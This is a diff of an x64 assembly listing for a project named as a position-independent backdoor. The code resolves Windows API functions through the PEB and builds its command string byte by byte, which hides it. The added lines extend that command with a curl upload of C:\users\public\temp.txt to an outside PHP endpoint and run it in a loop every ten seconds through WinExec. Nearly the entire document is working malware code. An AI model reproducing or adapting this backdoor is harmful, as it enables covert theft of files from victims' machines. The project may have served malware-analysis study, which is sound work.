@@ -35,21 +35,21 @@ winexec_name$ = 40
 load_lib_name$ = 48
 get_proc_name$ = 64
 cmd$ = 80
-base$ = 224
-kernel32_dll_name$ = 232
-load_lib$ = 264
-get_proc$ = 272
-_GetProcAddress$ = 280
-_WinExec$ = 288
-return_val$ = 296
-_LoadLibraryA$ = 304
-_Sleep$ = 312
+base$ = 336
+kernel32_dll_name$ = 344
+load_lib$ = 376
+get_proc$ = 384
+_GetProcAddress$ = 392
+_WinExec$ = 400
+_Sleep$ = 408
+return_val$1 = 416
+_LoadLibraryA$ = 424
 main	PROC
-; File C:\Users\Shayan Jadoon\Documents\Exclusion\RevEng Malware\Extract Shellcode\My Work\backdoor\backdoor.cpp
-; Line 8
-$LN7:
-	sub	rsp, 328				; 00000148H
-; Line 10
+; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\backdoor.cpp
+; Line 19
+$LN10:
+	sub	rsp, 440				; 000001b8H
+; Line 21
 	mov	eax, 107				; 0000006bH
 	mov	WORD PTR kernel32_dll_name$[rsp], ax
 	mov	eax, 101				; 00000065H
@@ -76,7 +76,7 @@ $LN7:
 	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
 	xor	eax, eax
 	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
-; Line 11
+; Line 22
 	mov	BYTE PTR load_lib_name$[rsp], 76	; 0000004cH
 	mov	BYTE PTR load_lib_name$[rsp+1], 111	; 0000006fH
 	mov	BYTE PTR load_lib_name$[rsp+2], 97	; 00000061H
@@ -90,7 +90,7 @@ $LN7:
 	mov	BYTE PTR load_lib_name$[rsp+10], 121	; 00000079H
 	mov	BYTE PTR load_lib_name$[rsp+11], 65	; 00000041H
 	mov	BYTE PTR load_lib_name$[rsp+12], 0
-; Line 12
+; Line 23
 	mov	BYTE PTR get_proc_name$[rsp], 71	; 00000047H
 	mov	BYTE PTR get_proc_name$[rsp+1], 101	; 00000065H
 	mov	BYTE PTR get_proc_name$[rsp+2], 116	; 00000074H
@@ -106,7 +106,7 @@ $LN7:
 	mov	BYTE PTR get_proc_name$[rsp+12], 115	; 00000073H
 	mov	BYTE PTR get_proc_name$[rsp+13], 115	; 00000073H
 	mov	BYTE PTR get_proc_name$[rsp+14], 0
-; Line 14
+; Line 25
 	mov	BYTE PTR winexec_name$[rsp], 87		; 00000057H
 	mov	BYTE PTR winexec_name$[rsp+1], 105	; 00000069H
 	mov	BYTE PTR winexec_name$[rsp+2], 110	; 0000006eH
@@ -115,14 +115,14 @@ $LN7:
 	mov	BYTE PTR winexec_name$[rsp+5], 101	; 00000065H
 	mov	BYTE PTR winexec_name$[rsp+6], 99	; 00000063H
 	mov	BYTE PTR winexec_name$[rsp+7], 0
-; Line 15
+; Line 26
 	mov	BYTE PTR sleep_name$[rsp], 83		; 00000053H
 	mov	BYTE PTR sleep_name$[rsp+1], 108	; 0000006cH
 	mov	BYTE PTR sleep_name$[rsp+2], 101	; 00000065H
 	mov	BYTE PTR sleep_name$[rsp+3], 101	; 00000065H
 	mov	BYTE PTR sleep_name$[rsp+4], 112	; 00000070H
 	mov	BYTE PTR sleep_name$[rsp+5], 0
-; Line 18
+; Line 30
 	mov	BYTE PTR cmd$[rsp], 99			; 00000063H
 	mov	BYTE PTR cmd$[rsp+1], 109		; 0000006dH
 	mov	BYTE PTR cmd$[rsp+2], 100		; 00000064H
@@ -259,77 +259,196 @@ $LN7:
 	mov	BYTE PTR cmd$[rsp+133], 116		; 00000074H
 	mov	BYTE PTR cmd$[rsp+134], 120		; 00000078H
 	mov	BYTE PTR cmd$[rsp+135], 116		; 00000074H
-	mov	BYTE PTR cmd$[rsp+136], 34		; 00000022H
-	mov	BYTE PTR cmd$[rsp+137], 32		; 00000020H
-	mov	BYTE PTR cmd$[rsp+138], 34		; 00000022H
-	mov	BYTE PTR cmd$[rsp+139], 0
-; Line 21
+	mov	BYTE PTR cmd$[rsp+136], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+137], 38		; 00000026H
+	mov	BYTE PTR cmd$[rsp+138], 38		; 00000026H
+	mov	BYTE PTR cmd$[rsp+139], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+140], 99		; 00000063H
+	mov	BYTE PTR cmd$[rsp+141], 117		; 00000075H
+	mov	BYTE PTR cmd$[rsp+142], 114		; 00000072H
+	mov	BYTE PTR cmd$[rsp+143], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+144], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+145], 45		; 0000002dH
+	mov	BYTE PTR cmd$[rsp+146], 45		; 0000002dH
+	mov	BYTE PTR cmd$[rsp+147], 102		; 00000066H
+	mov	BYTE PTR cmd$[rsp+148], 111		; 0000006fH
+	mov	BYTE PTR cmd$[rsp+149], 114		; 00000072H
+	mov	BYTE PTR cmd$[rsp+150], 109		; 0000006dH
+	mov	BYTE PTR cmd$[rsp+151], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+152], 34		; 00000022H
+	mov	BYTE PTR cmd$[rsp+153], 102		; 00000066H
+	mov	BYTE PTR cmd$[rsp+154], 105		; 00000069H
+	mov	BYTE PTR cmd$[rsp+155], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+156], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+157], 84		; 00000054H
+	mov	BYTE PTR cmd$[rsp+158], 111		; 0000006fH
+	mov	BYTE PTR cmd$[rsp+159], 85		; 00000055H
+	mov	BYTE PTR cmd$[rsp+160], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+161], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+162], 111		; 0000006fH
+	mov	BYTE PTR cmd$[rsp+163], 97		; 00000061H
+	mov	BYTE PTR cmd$[rsp+164], 100		; 00000064H
+	mov	BYTE PTR cmd$[rsp+165], 61		; 0000003dH
+	mov	BYTE PTR cmd$[rsp+166], 64		; 00000040H
+	mov	BYTE PTR cmd$[rsp+167], 67		; 00000043H
+	mov	BYTE PTR cmd$[rsp+168], 58		; 0000003aH
+	mov	BYTE PTR cmd$[rsp+169], 92		; 0000005cH
+	mov	BYTE PTR cmd$[rsp+170], 117		; 00000075H
+	mov	BYTE PTR cmd$[rsp+171], 115		; 00000073H
+	mov	BYTE PTR cmd$[rsp+172], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+173], 114		; 00000072H
+	mov	BYTE PTR cmd$[rsp+174], 115		; 00000073H
+	mov	BYTE PTR cmd$[rsp+175], 92		; 0000005cH
+	mov	BYTE PTR cmd$[rsp+176], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+177], 117		; 00000075H
+	mov	BYTE PTR cmd$[rsp+178], 98		; 00000062H
+	mov	BYTE PTR cmd$[rsp+179], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+180], 105		; 00000069H
+	mov	BYTE PTR cmd$[rsp+181], 99		; 00000063H
+	mov	BYTE PTR cmd$[rsp+182], 92		; 0000005cH
+	mov	BYTE PTR cmd$[rsp+183], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+184], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+185], 109		; 0000006dH
+	mov	BYTE PTR cmd$[rsp+186], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+187], 46		; 0000002eH
+	mov	BYTE PTR cmd$[rsp+188], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+189], 120		; 00000078H
+	mov	BYTE PTR cmd$[rsp+190], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+191], 34		; 00000022H
+	mov	BYTE PTR cmd$[rsp+192], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+193], 104		; 00000068H
+	mov	BYTE PTR cmd$[rsp+194], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+195], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+196], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+197], 115		; 00000073H
+	mov	BYTE PTR cmd$[rsp+198], 58		; 0000003aH
+	mov	BYTE PTR cmd$[rsp+199], 47		; 0000002fH
+	mov	BYTE PTR cmd$[rsp+200], 47		; 0000002fH
+	mov	BYTE PTR cmd$[rsp+201], 114		; 00000072H
+	mov	BYTE PTR cmd$[rsp+202], 46		; 0000002eH
+	mov	BYTE PTR cmd$[rsp+203], 98		; 00000062H
+	mov	BYTE PTR cmd$[rsp+204], 97		; 00000061H
+	mov	BYTE PTR cmd$[rsp+205], 97		; 00000061H
+	mov	BYTE PTR cmd$[rsp+206], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+207], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+208], 106		; 0000006aH
+	mov	BYTE PTR cmd$[rsp+209], 105		; 00000069H
+	mov	BYTE PTR cmd$[rsp+210], 98		; 00000062H
+	mov	BYTE PTR cmd$[rsp+211], 114		; 00000072H
+	mov	BYTE PTR cmd$[rsp+212], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+213], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+214], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+215], 46		; 0000002eH
+	mov	BYTE PTR cmd$[rsp+216], 99		; 00000063H
+	mov	BYTE PTR cmd$[rsp+217], 111		; 0000006fH
+	mov	BYTE PTR cmd$[rsp+218], 109		; 0000006dH
+	mov	BYTE PTR cmd$[rsp+219], 47		; 0000002fH
+	mov	BYTE PTR cmd$[rsp+220], 115		; 00000073H
+	mov	BYTE PTR cmd$[rsp+221], 104		; 00000068H
+	mov	BYTE PTR cmd$[rsp+222], 97		; 00000061H
+	mov	BYTE PTR cmd$[rsp+223], 100		; 00000064H
+	mov	BYTE PTR cmd$[rsp+224], 100		; 00000064H
+	mov	BYTE PTR cmd$[rsp+225], 121		; 00000079H
+	mov	BYTE PTR cmd$[rsp+226], 47		; 0000002fH
+	mov	BYTE PTR cmd$[rsp+227], 103		; 00000067H
+	mov	BYTE PTR cmd$[rsp+228], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+229], 116		; 00000074H
+	mov	BYTE PTR cmd$[rsp+230], 102		; 00000066H
+	mov	BYTE PTR cmd$[rsp+231], 105		; 00000069H
+	mov	BYTE PTR cmd$[rsp+232], 108		; 0000006cH
+	mov	BYTE PTR cmd$[rsp+233], 101		; 00000065H
+	mov	BYTE PTR cmd$[rsp+234], 46		; 0000002eH
+	mov	BYTE PTR cmd$[rsp+235], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+236], 104		; 00000068H
+	mov	BYTE PTR cmd$[rsp+237], 112		; 00000070H
+	mov	BYTE PTR cmd$[rsp+238], 34		; 00000022H
+	mov	BYTE PTR cmd$[rsp+239], 32		; 00000020H
+	mov	BYTE PTR cmd$[rsp+240], 34		; 00000022H
+	mov	BYTE PTR cmd$[rsp+241], 0
+; Line 33
 	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
 	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
 	mov	QWORD PTR base$[rsp], rax
-; Line 22
+; Line 34
 	cmp	QWORD PTR base$[rsp], 0
-	jne	SHORT $LN2@main
-; Line 23
+	jne	SHORT $LN4@main
+; Line 35
 	mov	eax, 1
 	jmp	$LN1@main
-$LN2@main:
-; Line 27
+$LN4@main:
+; Line 39
 	lea	rdx, QWORD PTR load_lib_name$[rsp]
 	mov	rcx, QWORD PTR base$[rsp]
 	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
 	mov	QWORD PTR load_lib$[rsp], rax
-; Line 28
+; Line 40
 	cmp	QWORD PTR load_lib$[rsp], 0
-	jne	SHORT $LN3@main
-; Line 29
+	jne	SHORT $LN5@main
+; Line 41
 	mov	eax, 2
 	jmp	$LN1@main
-$LN3@main:
-; Line 33
+$LN5@main:
+; Line 45
 	lea	rdx, QWORD PTR get_proc_name$[rsp]
 	mov	rcx, QWORD PTR base$[rsp]
 	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
 	mov	QWORD PTR get_proc$[rsp], rax
-; Line 34
+; Line 46
 	cmp	QWORD PTR get_proc$[rsp], 0
-	jne	SHORT $LN4@main
-; Line 35
+	jne	SHORT $LN6@main
+; Line 47
 	mov	eax, 3
 	jmp	$LN1@main
-$LN4@main:
-; Line 39
+$LN6@main:
+; Line 51
 	mov	rax, QWORD PTR load_lib$[rsp]
 	mov	QWORD PTR _LoadLibraryA$[rsp], rax
-; Line 41
+; Line 53
 	mov	rax, QWORD PTR get_proc$[rsp]
 	mov	QWORD PTR _GetProcAddress$[rsp], rax
-; Line 45
+; Line 57
 	lea	rdx, QWORD PTR winexec_name$[rsp]
 	mov	rcx, QWORD PTR base$[rsp]
 	call	QWORD PTR _GetProcAddress$[rsp]
 	mov	QWORD PTR _WinExec$[rsp], rax
-; Line 49
+; Line 61
 	cmp	QWORD PTR _WinExec$[rsp], 0
-	jne	SHORT $LN5@main
+	jne	SHORT $LN7@main
 	mov	eax, 4
 	jmp	SHORT $LN1@main
-$LN5@main:
-; Line 54
+$LN7@main:
+; Line 66
 	lea	rdx, QWORD PTR sleep_name$[rsp]
 	mov	rcx, QWORD PTR base$[rsp]
 	call	QWORD PTR _GetProcAddress$[rsp]
 	mov	QWORD PTR _Sleep$[rsp], rax
-; Line 62
+; Line 69
+	cmp	QWORD PTR _Sleep$[rsp], 0
+	jne	SHORT $LN8@main
+	mov	eax, 5
+	jmp	SHORT $LN1@main
+$LN8@main:
+$LN2@main:
+; Line 71
+	xor	eax, eax
+	cmp	eax, 1
+	je	SHORT $LN3@main
+; Line 73
 	xor	edx, edx
 	lea	rcx, QWORD PTR cmd$[rsp]
 	call	QWORD PTR _WinExec$[rsp]
-	mov	DWORD PTR return_val$[rsp], eax
-; Line 64
+	mov	DWORD PTR return_val$1[rsp], eax
+; Line 74
+	mov	ecx, 10000				; 00002710H
+	call	QWORD PTR _Sleep$[rsp]
+; Line 75
+	jmp	SHORT $LN2@main
+$LN3@main:
+; Line 78
 	xor	eax, eax
 $LN1@main:
-; Line 65
-	add	rsp, 328				; 00000148H
+; Line 79
+	add	rsp, 440				; 000001b8H
 	ret	0
 main	ENDP
 _TEXT	ENDS
@@ -354,7 +473,7 @@ funcRVA$6 = 96
 module$ = 128
 func_name$ = 136
 ?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
-; File C:\Users\Shayan Jadoon\Documents\Exclusion\RevEng Malware\Extract Shellcode\My Work\backdoor\peb_lookup.h
+; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
 ; Line 104
 $LN13:
 	mov	QWORD PTR [rsp+16], rdx
@@ -554,7 +673,7 @@ Flink$ = 64
 list$ = 72
 module_name$ = 128
 ?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
-; File C:\Users\Shayan Jadoon\Documents\Exclusion\RevEng Malware\Extract Shellcode\My Work\backdoor\peb_lookup.h
+; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
 ; Line 69
 $LN16:
 	mov	QWORD PTR [rsp+8], rcx
